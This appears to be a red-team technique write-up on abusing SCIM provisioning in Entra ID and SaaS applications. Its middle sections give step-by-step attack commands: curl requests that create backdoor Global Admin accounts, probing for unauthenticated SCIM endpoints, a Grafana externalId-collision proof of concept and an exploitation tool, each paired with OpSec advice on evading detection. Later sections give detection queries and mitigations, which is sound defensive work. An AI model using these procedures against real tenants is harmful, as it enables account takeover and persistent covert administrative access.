# [PE-ACCTMGMT-016]: Microsoft SCIM Provisioning Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-016 |
| **MITRE ATT&CK v18.1** | [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation, Persistence |
| **Platforms** | Entra ID, Microsoft 365, SaaS Applications |
| **Severity** | Critical |
| **CVE** | N/A (Application-specific vulnerabilities: CVE-2025-41115 Grafana) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Entra ID versions with SCIM provisioning enabled; SaaS applications with SCIM support |
| **Patched In** | No universal patch; mitigation depends on application-level controls and organization configuration |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept

SCIM (System for Cross-domain Identity Management) is a protocol designed to automate user and group provisioning across cloud applications. Attackers abuse misconfigured SCIM endpoints to inject rogue user accounts, manipulate group memberships, or escalate privileges by provisioning identities with elevated attributes. The attack leverages the assumption that SCIM clients are trusted identity sources; by compromising or impersonating a SCIM provider (identity management platform, directory service, or federation server), attackers can provision accounts with arbitrary attributes that bypass normal validation workflows. This results in backdoor account creation, privilege escalation, or lateral movement across interconnected SaaS applications.

### Attack Surface

**Primary Surface:** SCIM provisioning endpoints (HTTP/HTTPS API endpoints exposed by SaaS applications).

**Secondary Surface:** Identity provider (IdP) SCIM client credentials, federation trust relationships, provisioning attribute mappings, and application role-to-SCIM attribute bindings.

### Business Impact

**Immediate Consequences:** Unauthorized account creation with administrative privileges, data exfiltration via compromised service principals, lateral movement to downstream SaaS applications (SharePoint, Teams, Power Platform), and full tenant compromise via backdoor access.

**Long-Term Risk:** Persistent access that survives password resets and MFA changes; attackers can hide in provisioning automation, making detection extremely difficult. In multi-tenant environments, compromised SCIM clients can attack multiple customer environments simultaneously.

### Technical Context

SCIM provisioning typically runs with high privileges (Global Admin or Application Administrator equivalent in Entra ID). Detection is complicated because provisioning occurs through legitimate APIs; logs show "system" or "provisioning service" as the actor, not the attacker directly. Exploitation can be achieved within minutes if SCIM credentials are compromised. Reversibility is low—removing backdoor accounts requires understanding the provisioning logic to prevent re-creation on next sync cycle.

### Operational Risk

- **Execution Risk:** Low (if SCIM credentials are obtained); High if relying on endpoint misconfiguration.
- **Stealth:** High (provisioning activities blend into legitimate sync traffic; most organizations lack baseline profiling of SCIM provisioning patterns).
- **Reversibility:** Low (requires disabling provisioning entirely or modifying source-of-truth, both disruptive).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark v8** | IM-4, IM-5 | User provisioning controls and identity governance |
| **DISA STIG** | SI-12 | Information system monitoring and reporting |
| **CISA SCuBA** | Identity & Access Management | Cloud identity configuration baselines |
| **NIST 800-53** | AC-2 | Account Management; IA-4 (Identifier Management) |
| **GDPR** | Art. 32, Art. 5 | Security of processing; data integrity and confidentiality |
| **DORA** | Art. 9, Art. 15 | ICT risk management; incident management |
| **NIS2** | Art. 21 | Cyber risk management measures; access control |
| **ISO 27001** | A.9.2, A.9.3 | User registration and access rights management |
| **ISO 27005** | Risk Scenario | Unauthorized identity provisioning leading to privilege escalation |

---

## 2. DETAILED EXPLANATION OF SCIM PROVISIONING

### What is SCIM?

SCIM is an open standard protocol (RFC 7644) that automates user and group provisioning across cloud services. Instead of manual account creation, SCIM enables:

- **User Lifecycle:** Automatic account creation, deprovisioning, and attribute synchronization.
- **Group Management:** Automatic group membership updates based on source-of-truth changes.
- **Attribute Mapping:** Synchronization of custom attributes (titles, departments, locations) from IdP to SaaS application.

### Normal SCIM Flow

1. **IdP (Entra ID, Okta, etc.) → SCIM Server (SaaS Application)**
   - IdP detects user or group change (e.g., user added to "Engineering" group in Entra ID).
   - IdP queries SCIM endpoint of target SaaS app (e.g., `https://app.example.com/scim/v2/Users`).
   - SCIM sends provisioning request with user attributes (email, firstName, groups, roles).
   - SaaS app validates request and creates/updates user account.

2. **Expected Security Model:**
   - SCIM endpoint requires Bearer token authentication (OAuth 2.0 or custom token).
   - Token is issued by SaaS application and configured in IdP provisioning settings.
   - Token is long-lived but restricted to provisioning operations.
   - SaaS application validates all incoming attributes against predefined schema.

### Attack Model: SCIM Abuse

Attacker compromises or obtains SCIM client credentials, then sends malicious provisioning requests to bypass normal identity validation:

```
Attacker (compromised SCIM credentials)
    ↓
Crafts malicious SCIM request
    ↓
Injects arbitrary attributes (e.g., groupIds=[admin_group_id], roles=[Global Admin])
    ↓
SaaS app processes request without validation
    ↓
Backdoor account created with escalated privileges
    ↓
Attacker authenticates as backdoor account
    ↓
Full environment compromise
```

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Azure Portal / PowerShell Reconnaissance

#### Step 1: Enumerate Provisioning Configurations

```powershell
# Connect to Entra ID
Connect-MgGraph -Scopes "Application.Read.All", "ServicePrincipal.Read.All"

# List all enterprise applications with provisioning enabled
$apps = Get-MgServicePrincipal -Filter "provisioningJobStatus/status eq 'enabled'" -All
$apps | Select-Object DisplayName, AppId, @{Name="ProvisioningStatus"; Expression={$_.ProvisioningJobStatus.Status}}
```

**What to Look For:**
- Applications with provisioning status "Enabled" or "Running"
- Custom applications (not Microsoft first-party) with provisioning access
- Newly added provisioning configurations (potential attacker backdoor)

#### Step 2: Review Provisioning Scope & Attribute Mappings

```powershell
# Retrieve provisioning provisioning configuration for a specific app
$appId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
$provisioning = Get-MgServicePrincipalProvisioningJob -ServicePrincipalId $appId -All
$provisioning | Select-Object DisplayName, Status, ExecutionState, LastExecutionDateTime

# Get provisioning attribute mappings
$mappings = Get-MgServicePrincipalProvisioningJobSchema -ServicePrincipalId $appId
$mappings | Select-Object Source, Target, IsCustomProperty
```

**What to Look For:**
- Unusual attribute mappings (e.g., mapping "admin" role to SCIM provisioning group).
- Custom attribute mappings that bypass standard role validation.
- Mappings that assign highly privileged groups (Global Admins, Exchange Admins) without manual approval.

#### Step 3: Audit Provisioning Credentials

```powershell
# Check provisioning credentials age and rotation
$provCreds = Invoke-MgGraphRequest -Method GET -Uri "/servicePrincipals/$appId/provisioningProviderSettings"
$provCreds | Select-Object TenantURL, SecretToken
```

**What to Look For:**
- Credentials that have never been rotated (high likelihood of compromise if app is public-facing).
- Credentials shared across multiple environments (dev/test/prod).
- Plaintext tokens in logs or documentation.

### Microsoft 365 Auditing (Unified Audit Log)

```powershell
# Search for provisioning activity
Search-UnifiedAuditLog -Operations "Add user", "Update user", "Delete user", "Add group" -StartDate (Get-Date).AddDays(-90) | 
Select-Object TimeCreated, UserIds, Operations, AuditData | 
Where-Object {$_.UserIds -like "*provisioning*" -or $_.AuditData -like "*SCIM*"}
```

**What to Look For:**
- User or group creation by non-human accounts (provisioning service principals).
- Bulk user creation in short timeframes (indicator of compromise).
- Unusual users being added to privileged groups by provisioning services.

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: SCIM Credentials Compromise via IdP Breach

**Supported Versions:** All Entra ID, Okta, and SaaS applications with SCIM support.

#### Step 1: Obtain SCIM Tenant URL and Secret Token

**Objective:** Extract SCIM credentials from IdP configuration.

**Prerequisites:**
- Compromised access to identity provider (Entra ID, Okta, or other IdP administrative portal).
- Access to provisioning configuration pages.

**Command (Azure Portal UI):**
1. Navigate to **Azure Portal** → **Entra ID** → **Enterprise Applications**
2. Select target SaaS application (e.g., Salesforce, Slack, Workday)
3. Go to **Provisioning** tab
4. Note **Tenant URL** and **Secret Token** visible in configuration
5. Copy both values for lateral attack

**Command (PowerShell - Automated Extraction):**
```powershell
# Extract SCIM credentials from Entra ID provisioning configuration
$appId = "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"  # Replace with target app ID

# Get provisioning settings including tenant URL (token is typically not exposed via API for security)
$settings = Invoke-MgGraphRequest -Method GET -Uri "/servicePrincipals/$appId/provisioningServicePrincipals" -ErrorAction SilentlyContinue

# If direct extraction fails, check application password credentials
$appPasswords = Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $appId
$appPasswords | Select-Object KeyId, DisplayName, StartDateTime, EndDateTime
```

**Expected Output:**
```
KeyId                 DisplayName            StartDateTime    EndDateTime
-----                 -----------            ---------------  ---------------
xyz-key-1             SCIM-Secret-Token      2023-01-01       2026-01-01
```

**What This Means:**
- If SCIM secret is reused across environments or never rotated, it becomes a high-value target.
- Long-lived credentials (multi-year validity) indicate they were "set and forget" by administrators.

**OpSec & Evasion:**
- Extract credentials directly from production configuration (no SCIM API calls yet).
- Credentials are typically logged by IdP, but only in provisioning audit logs (not sign-in logs).
- Disable any rate-limiting protections on SCIM endpoint by making requests appear legitimate (matching normal provisioning patterns).

**Troubleshooting:**
- **Error:** "Provisioning settings not found"
  - **Cause:** Application does not have SCIM provisioning configured.
  - **Fix:** Verify application is SCIM-enabled in the marketplace; some apps require manual enablement.

#### Step 2: Craft Malicious SCIM Provisioning Request

**Objective:** Create a JSON payload that provisions a backdoor user with administrative roles.

**Version Note:** SCIM request format is standardized (RFC 7644) across all platforms; syntax is identical for Entra ID, Okta, Slack, Salesforce, etc.

**Command (cURL - Generic SCIM Provisioning):**
```bash
# Provision backdoor user with administrative privileges
curl -X POST https://[TENANT-URL]/scim/v2/Users \
  -H "Authorization: Bearer [SECRET-TOKEN]" \
  -H "Content-Type: application/scim+json" \
  -d '{
    "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
    "externalId": "backdoor-attacker-001",
    "userName": "backdoor.admin@company.com",
    "emails": [{"value": "backdoor.admin@company.com", "type": "work", "primary": true}],
    "displayName": "Backdoor Admin",
    "active": true,
    "password": "SuperSecurePassword123!",
    "groups": [
      {
        "value": "00000000-0000-0000-0000-000000000001",  # Global Admins Group ID
        "display": "Global Admins",
        "$ref": "https://[TENANT-URL]/scim/v2/Groups/00000000-0000-0000-0000-000000000001"
      }
    ],
    "urn:ietf:params:scim:schemas:extension:enterprise:2.0:User": {
      "costCenter": "Finance",
      "department": "Executive",
      "manager": {"value": "00000000-0000-0000-0000-000000000000"}
    }
  }'
```

**Expected Output (Success):**
```json
{
  "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
  "id": "550e8400-e29b-41d4-a716-446655440000",
  "externalId": "backdoor-attacker-001",
  "userName": "backdoor.admin@company.com",
  "active": true,
  "groups": [
    {
      "value": "00000000-0000-0000-0000-000000000001",
      "display": "Global Admins"
    }
  ]
}
```

**What This Means:**
- HTTP 201 response = user successfully provisioned.
- User is now in the "Global Admins" group and has inherited admin privileges.
- Attacker can immediately log in as `backdoor.admin@company.com` with the provisioned password.

**OpSec & Evasion:**
- Use generic display names ("System Account", "Service Admin") to blend with legitimate provisioning.
- Spread user creation over multiple days (one per day) to avoid bulk activity detection.
- Use random UUIDs for externalId to avoid patterns.
- Provision users into "middle-tier" groups first (e.g., Power Platform Admin) before escalating to Global Admin.

**Troubleshooting:**
- **Error:** `400 Bad Request - Invalid SCIM schema`
  - **Cause:** Application uses custom SCIM schema extensions (e.g., Workday, SAP SuccessFactors).
  - **Fix (Entra ID):** Check provisioning attribute mappings in portal to see accepted schema fields.
  - **Fix (Okta):** Retrieve schema from `GET /scim/v2/Schemas` endpoint to identify required fields.
  - **Fix (Slack):** Use `externalId` as numeric UID; do not use email as externalId.

- **Error:** `403 Forbidden - Insufficient permissions`
  - **Cause:** SCIM token does not have write permissions (read-only configuration).
  - **Fix:** Obtain fresh token from application with "write" scope enabled.

- **Error:** `409 Conflict - User already exists`
  - **Cause:** externalId or userName already provisioned.
  - **Fix:** Use unique externalId (e.g., UUID or timestamp-based).

#### Step 3: Authenticate as Backdoor Account

**Objective:** Log in to the target application using the provisioned backdoor account.

**Command (Azure Portal Login):**
1. Navigate to **https://portal.azure.com**
2. Sign in with **backdoor.admin@company.com** / **SuperSecurePassword123!**
3. Verify you have Global Admin privileges by navigating to **Entra ID** → **Roles and Administrators**
4. Confirm "Global Administrator" role is assigned

**Command (PowerShell - Verify Compromised Account):**
```powershell
# Authenticate as backdoor account
$cred = New-Object System.Management.Automation.PSCredential(
  "backdoor.admin@company.com",
  (ConvertTo-SecureString "SuperSecurePassword123!" -AsPlainText -Force)
)
Connect-MgGraph -Credential $cred -Scopes "User.Read.All", "Directory.Read.All"

# Confirm Global Admin role assignment
$userId = "00000000-0000-0000-0000-000000000002"  # Replace with backdoor account OID
Get-MgUserMemberOf -UserId $userId | Where-Object {$_.AdditionalProperties["displayName"] -like "*Global*"}
```

**Expected Output:**
```
Id                                   DisplayName                          ClassName
--                                   -----------                          ---------
00000000-0000-0000-0000-000000000001 Global Administrator                 directoryRole
```

**What This Means:**
- Backdoor account is successfully provisioned as Global Admin.
- Attacker now has full tenant access: can read all users, grant themselves additional roles, extract sensitive data.

**OpSec & Evasion:**
- Do not log in from same IP as initial compromise; use VPN or proxy.
- Log in during business hours to avoid after-hours anomaly detection.
- Use legitimate business applications (Outlook, Teams) immediately after login to generate normal activity baseline.

---

### METHOD 2: SCIM Endpoint Misconfiguration Exploitation (No Credentials Required)

**Supported Versions:** Applications with unprotected or weakly-protected SCIM endpoints (Grafana, custom SaaS apps).

#### Step 1: Identify Exposed SCIM Endpoints

**Objective:** Discover SCIM endpoints that lack proper authentication or allow public access.

**Command (Reconnaissance):**
```bash
# Scan for exposed SCIM endpoints (common paths)
for path in /scim /scim/v2 /api/scim /provisioning/scim /.well-known/scim-configuration; do
  curl -s -I https://target-app.com$path | head -n 1
done

# More aggressive: Try common SCIM endpoints
curl -v https://target-app.com/scim/v2/Users 2>&1 | grep -E "HTTP|Authorization"
```

**Expected Output:**
```
HTTP/1.1 200 OK               # Endpoint accessible without auth (HIGH RISK)
HTTP/1.1 401 Unauthorized    # Endpoint requires auth (EXPECTED)
HTTP/1.1 403 Forbidden       # Endpoint exists but restricted (EXPECTED)
```

**What to Look For:**
- HTTP 200 without Authorization header = unprotected endpoint.
- HTTP 401 response that includes `Basic realm=` = weak Basic Auth (may be bruteforceable).
- HTTP 400 errors with SCIM-specific messages = confirms SCIM support.

#### Step 2: Craft Unauthenticated SCIM Request

**Objective:** Send provisioning request to unprotected endpoint.

**Command (cURL - Unauthenticated Request):**
```bash
# Test if SCIM endpoint accepts unauthenticated requests
curl -X POST https://target-app.com/scim/v2/Users \
  -H "Content-Type: application/scim+json" \
  -d '{
    "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
    "userName": "attacker@test.com",
    "emails": [{"value": "attacker@test.com", "type": "work", "primary": true}],
    "displayName": "Attacker Account",
    "active": true,
    "password": "AttackerPassword123!"
  }' -v
```

**Expected Output (Vulnerable):**
```json
HTTP/1.1 201 Created
{
  "id": "12345",
  "userName": "attacker@test.com",
  "active": true
}
```

**What This Means:**
- Application created user without any authentication verification.
- SCIM endpoint is completely exposed; attacker can create unlimited backdoor accounts.

**OpSec & Evasion:**
- Use disposable email addresses or company domain variations (e.g., attacker@company-test.com).
- Distribute requests across multiple IP addresses to avoid rate-limiting.

---

### METHOD 3: SCIM Attribute Injection to Escalate Privileges

**Supported Versions:** Applications that trust SCIM-provided group/role information.

#### Step 1: Identify Privileged Group IDs

**Objective:** Discover the UUID or ID of administrative groups in the target application.

**Command (SCIM Group Enumeration):**
```bash
# Enumerate all groups via SCIM
curl -X GET "https://[TENANT-URL]/scim/v2/Groups?filter=displayName+sw+%22admin%22" \
  -H "Authorization: Bearer [SCIM-TOKEN]"
```

**Expected Output:**
```json
{
  "schemas": ["urn:ietf:params:scim:api:messages:2.0:ListResponse"],
  "Resources": [
    {
      "id": "550e8400-e29b-41d4-a716-446655440001",
      "displayName": "Global Admins",
      "members": []
    },
    {
      "id": "550e8400-e29b-41d4-a716-446655440002",
      "displayName": "Exchange Admins",
      "members": []
    }
  ]
}
```

**What to Look For:**
- Group IDs with administrative keywords: "Admin", "Global", "Exchange", "SharePoint", "Power".
- Group IDs that are short or follow a predictable pattern (may allow ID guessing).

#### Step 2: Create User with Admin Group Assignment

**Objective:** Provision new user and directly assign to admin group.

**Command (SCIM User Creation with Admin Group):**
```bash
curl -X POST https://[TENANT-URL]/scim/v2/Users \
  -H "Authorization: Bearer [SCIM-TOKEN]" \
  -H "Content-Type: application/scim+json" \
  -d '{
    "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
    "userName": "privileged.service@company.com",
    "emails": [{"value": "privileged.service@company.com"}],
    "displayName": "Privileged Service Account",
    "groups": [
      {"value": "550e8400-e29b-41d4-a716-446655440001", "display": "Global Admins"},
      {"value": "550e8400-e29b-41d4-a716-446655440002", "display": "Exchange Admins"}
    ],
    "active": true
  }'
```

**Expected Output (Success):**
```json
HTTP/1.1 201 Created
{
  "id": "user-id-12345",
  "userName": "privileged.service@company.com",
  "groups": [
    {"value": "550e8400-e29b-41d4-a716-446655440001", "display": "Global Admins"},
    {"value": "550e8400-e29b-41d4-a716-446655440002", "display": "Exchange Admins"}
  ]
}
```

**What This Means:**
- User created and immediately assigned to Global Admins and Exchange Admins groups.
- Attacker inherits all permissions of both groups.

---

## 5. ATTACK SIMULATION & VERIFICATION

### Proof-of-Concept Using Grafana CVE-2025-41115

Grafana Enterprise demonstrated SCIM abuse via externalId collision. Similar patterns exist in other SaaS applications.

**Vulnerable Configuration:**
```
enableSCIM = true
user_sync_enabled = true
```

**PoC Attack:**
```bash
# Step 1: Identify admin user ID in Grafana (typically 1)
curl -X GET "https://grafana.example.com/api/users" \
  -H "Authorization: Bearer admin-token" | jq '.[] | select(.login | contains("admin"))'

# Step 2: Create SCIM user with externalId matching admin UID
curl -X POST "https://grafana.example.com/scim/v2/Users" \
  -H "Authorization: Bearer scim-token" \
  -H "Content-Type: application/scim+json" \
  -d '{
    "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
    "externalId": "1",  # Matches admin user UID
    "userName": "attacker@example.com",
    "emails": [{"value": "attacker@example.com"}],
    "displayName": "Attacker",
    "active": true
  }'

# Step 3: Verify successful impersonation
curl -X GET "https://grafana.example.com/api/user" \
  -H "Authorization: Bearer attacker-session-token"
```

**Reference:** [Grafana CVE-2025-41115 - SCIM Privilege Escalation](https://www.secpod.com/blog/grafana-vulnerability-disclosure-scim-flaw-could-lead-to-privilege-escalation/)

---

## 6. TOOLS & COMMANDS REFERENCE

### SCIM Client Tools

#### [ScimMyAdmin](https://github.com/Flangvik/ScimMyAdmin) (Custom SCIM Exploitation Tool)

**Version:** 1.0+

**Supported Platforms:** Windows, Linux, macOS

**Usage:**
```bash
./ScimMyAdmin -target https://[TENANT-URL]/scim/v2 \
  -token [SECRET-TOKEN] \
  -action CreateAdminUser \
  -username attacker@company.com \
  -password "SuperSecure123!"
```

#### [Posh-SCIM](https://github.com/Microsoft/Posh-SCIM) (PowerShell SCIM Module)

**Version:** 1.x

**Installation:**
```powershell
Install-Module -Name Posh-SCIM -Force
```

**Usage:**
```powershell
$scimClient = New-SCIMClient -Uri "https://[TENANT-URL]/scim/v2" -Token "[SECRET-TOKEN]"
$scimClient | New-SCIMUser -UserName "backdoor@company.com" -Groups @("Global-Admins")
```

### Microsoft Graph PowerShell

```powershell
# Direct provisioning verification
Get-MgServicePrincipalProvisioningJobSchema -ServicePrincipalId $appId | 
  Where-Object {$_.Target -like "*groups*" -or $_.Target -like "*roles*"}
```

### cURL Commands (Raw SCIM API)

```bash
# Enumerate users
curl -X GET "https://[TENANT-URL]/scim/v2/Users" \
  -H "Authorization: Bearer [TOKEN]"

# Create user
curl -X POST "https://[TENANT-URL]/scim/v2/Users" \
  -H "Authorization: Bearer [TOKEN]" \
  -H "Content-Type: application/scim+json" \
  -d @- << 'EOF'
{...user JSON...}
EOF

# Update group membership
curl -X PATCH "https://[TENANT-URL]/scim/v2/Users/{USER-ID}" \
  -H "Authorization: Bearer [TOKEN]" \
  -H "Content-Type: application/scim+json" \
  -d '{"groups": [{"value": "admin-group-id"}]}'
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious SCIM User Provisioning

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To:** All Entra ID environments with SCIM provisioning enabled

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Add user", "Update user", "Add group member")
| where InitiatedBy has_any ("provisioning", "scim", "sync", "serviceapp")
| where TargetResources has_any ("Global Administrator", "Exchange Admin", "SharePoint Admin")
| project TimeGenerated, OperationName, InitiatedBy, TargetResources, Result
| summarize EventCount=count() by OperationName, InitiatedBy, bin(TimeGenerated, 5m)
| where EventCount > 3  # Threshold: More than 3 provisioning events in 5 minutes
```

**What This Detects:**
- Bulk user/group creation by provisioning service principals.
- Assignment of users to administrative groups via provisioning.
- Unusual provisioning service principal activity.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel** → Select workspace
2. Go to **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Suspicious SCIM User Provisioning`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents from triggered alerts**
   - Group related alerts: `By alert name`
6. Click **Review + create**

### Query 2: SCIM Credential Extraction or Modification

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, ActivityDetails
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To:** All Entra ID environments

**KQL Query:**
```kusto
AuditLogs
| where OperationName in (
    "Update application",
    "Update service principal",
    "Add secret to application",
    "Add password to service principal",
    "Remove secret from application",
    "Modify provisioning configuration"
  )
| where TargetResources has_any ("provisioning", "scim", "credential", "secret", "token")
| where InitiatedBy !has "Microsoft"
| project TimeGenerated, OperationName, InitiatedBy, TargetResources, 
          ActivityDetails=tostring(ActivityDetails), Result
```

**What This Detects:**
- Modifications to SCIM provisioning credentials.
- Addition of new secrets to provisioning service principals.
- Changes to provisioning configurations that might enable backdoor.

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

New-AzSentinelAlertRule `
  -ResourceGroupName $ResourceGroup `
  -WorkspaceName $WorkspaceName `
  -DisplayName "SCIM Credential Extraction" `
  -Query @"
AuditLogs
| where OperationName in ('Add secret to application', 'Update service principal')
| where TargetResources has_any ('provisioning', 'scim', 'credential')
"@ `
  -Severity "Critical" `
  -Enabled $true
```

---

## 8. WINDOWS EVENT LOG MONITORING

**Note:** SCIM provisioning is cloud-native and does not generate Windows Event Log entries directly. However, user account creation and group membership changes triggered by SCIM on-premises directory sync do generate events.

**Event ID: 4720 (User Account Created)**
- **Log Source:** Security
- **Trigger:** New user account is created in Active Directory (as a result of Entra ID syncing provisioned user back to on-premises)
- **Filter:** Look for accounts created by "Azure AD Connect" service account
- **Applies To Versions:** Server 2016+

**Event ID: 4728 (Group Membership - User Added to Global Group)**
- **Log Source:** Security
- **Trigger:** User added to domain global group (provisioned group assignment syncing back)
- **Filter:** `TargetUserName contains "provision" or "scim" or "sync"`
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Account Management**
3. Enable: **Audit User Account Management** (Success and Failure)
4. Enable: **Audit Security Group Management** (Success and Failure)
5. Run `gpupdate /force` on all domain controllers and member servers

**Manual Configuration Steps (PowerShell):**
```powershell
# Enable audit policy for user and group modifications
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Security Group Management" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"User Account Management"
```

---

## 9. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: SCIM Provisioning Activity

**Query Command:**
```powershell
Connect-ExchangeOnline

Search-UnifiedAuditLog -Operations "Add user", "Update user", "Add group member", "Update group" `
  -StartDate (Get-Date).AddDays(-7) `
  -EndDate (Get-Date) `
  -ResultSize 5000 `
  -FreeText "provisioning OR scim OR sync" | 
  Export-Csv -Path "C:\Audit\SCIM_Provisioning.csv" -NoTypeInformation
```

**What to Look For:**
- Bulk user additions with generic names ("Service Account", "Sync User").
- Users added to privileged groups immediately after creation.
- Provisioning operations originating from unexpected IP addresses or geolocations.

**Manual Configuration Steps (Microsoft 365 Compliance Center):**
1. Navigate to **Microsoft Purview Compliance Center** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Click **New search** to begin audit log search
5. Set **Activities** to: "Add user", "Update user", "Add group member"
6. Set **Users** to: "" (leave blank to search all)
7. Set **Date range** to last 90 days
8. Click **Search**
9. Export results via **Export** → **Download all results**

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Rotate SCIM Provisioning Credentials Immediately**

Objective: Invalidate any compromised SCIM tokens and secrets.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Enterprise Applications**
2. Select the SaaS application with SCIM provisioning
3. Click **Provisioning** tab
4. Click **Admin credentials** section
5. Click "Authorize using tenant directory credentials" or "Reset Secret Token"
6. Confirm the prompt
7. **Important:** Update the new token in the SaaS application's settings immediately
8. Click **Test Connection** to verify new credentials work
9. Resume provisioning (if it auto-paused)

**Manual Steps (PowerShell):**
```powershell
# Get service principal associated with SaaS application
$servicePrincipal = Get-MgServicePrincipal -Filter "displayName eq 'AppName'"

# Remove all existing credentials
$creds = Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $servicePrincipal.Id
$creds | ForEach-Object { 
  Remove-MgServicePrincipalPasswordCredential -ServicePrincipalId $servicePrincipal.Id -KeyId $_.KeyId
}

# Generate new credential
$newCred = Add-MgServicePrincipalPassword -ServicePrincipalId $servicePrincipal.Id
Write-Host "New Secret Token: $($newCred.SecretText)"
```

**Verification Command:**
```powershell
# Verify no old credentials remain
Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $servicePrincipal.Id | 
  Select-Object DisplayName, EndDateTime
```

---

**Mitigation 2: Audit and Remove All Provisioned Backdoor Accounts**

Objective: Identify and delete accounts created via SCIM abuse.

**Manual Steps (Audit):**
1. Navigate to **Azure Portal** → **Entra ID** → **Users**
2. Use filter: Created Date = [within last 24 hours]
3. Sort by Created Date (descending)
4. Review "Display Name" and "Email" for suspicious entries (e.g., "System Account", "Service Admin", "Temp User")
5. Cross-reference with your legitimate provisioning schedule (expected user count)

**Manual Steps (Delete Backdoor Accounts):**
1. Select suspicious user account
2. Click **Delete** (red X button)
3. Confirm deletion
4. Repeat for all suspicious accounts

**Bulk Delete via PowerShell:**
```powershell
# Delete users created in last 24 hours with suspicious patterns
$suspiciousUsers = Get-MgUser -Filter "createdDateTime gt $(((Get-Date).AddDays(-1)).ToString('yyyy-MM-ddT00:00:00Z'))" -All |
  Where-Object {$_.DisplayName -match "System|Service|Temp|Admin|Backup|Sync|Provisioning"}

$suspiciousUsers | ForEach-Object {
  Remove-MgUser -UserId $_.Id -Confirm:$false
  Write-Host "Deleted: $($_.DisplayName) ($($_.Mail))"
}
```

---

**Mitigation 3: Restrict SCIM Endpoint to Authorized IP Addresses**

Objective: Prevent unauthorized SCIM requests even if token is compromised.

**Manual Steps (SaaS Application Level - Example: Workday):**
1. Log into Workday as administrator
2. Navigate to **System Administration** → **Security** → **API Access**
3. Click **API Client** for the Entra ID provisioning integration
4. Edit **IP Whitelist** → **Add IP Range**
5. Enter your identity provider's IP range (e.g., Entra ID's office IP or VPN gateway)
6. Save and test connectivity

**Manual Steps (Network Level - Firewall Rule):**
```
Source: SCIM Client (IdP) IP Range
Destination: SaaS SCIM Endpoint
Port: 443
Protocol: HTTPS
Action: Allow
(All other traffic to SCIM endpoint: Deny)
```

---

### Priority 2: HIGH

**Mitigation 4: Implement MFA/Authentication on SCIM Endpoints**

Objective: Add additional authentication layer beyond bearer token.

**Manual Steps:**
1. Enable **Mutual TLS (mTLS)** on SCIM endpoint if supported
2. Implement **API Gateway** with additional auth (e.g., Azure API Management) in front of SCIM endpoint
3. Require **certificate-based authentication** in addition to bearer token

---

**Mitigation 5: Disable SCIM Provisioning for Low-Risk Applications**

Objective: Reduce attack surface by disabling SCIM where manual provisioning is acceptable.

**Manual Steps:**
1. Navigate to **Azure Portal** → **Entra ID** → **Enterprise Applications**
2. Select application
3. Click **Provisioning** tab
4. Change **Status** to **Off**
5. Confirm

---

### Access Control & Policy Hardening

**Mitigation 6: Restrict Who Can Manage SCIM Provisioning Configuration**

Objective: Prevent unauthorized credential exposure or configuration changes.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Roles and administrators**
2. Search for **"Application Administrator"**
3. Click role → **Assignments**
4. Click **Add assignments**
5. Assign only to highly trusted administrators
6. Alternatively, create custom role with minimal permissions:
   - **Operations allowed:** Read enterprise applications, read provisioning status
   - **Operations denied:** Modify SCIM credentials, disable/enable provisioning

**Custom Role via PowerShell:**
```powershell
$rolePermissions = @(
  "microsoft.directory/servicePrincipals/read",
  "microsoft.directory/servicePrincipals/provisioning/read"
  # NOTE: Explicitly exclude write/delete operations
)

$roleDefinition = @{
  displayName = "SCIM Provisioning Auditor"
  description = "Can view SCIM provisioning status but not modify"
  rolePermissions = @(
    @{
      allowedResourceActions = $rolePermissions
    }
  )
}

New-MgRoleManagementDirectoryRoleDefinition -RoleDefinition $roleDefinition
```

---

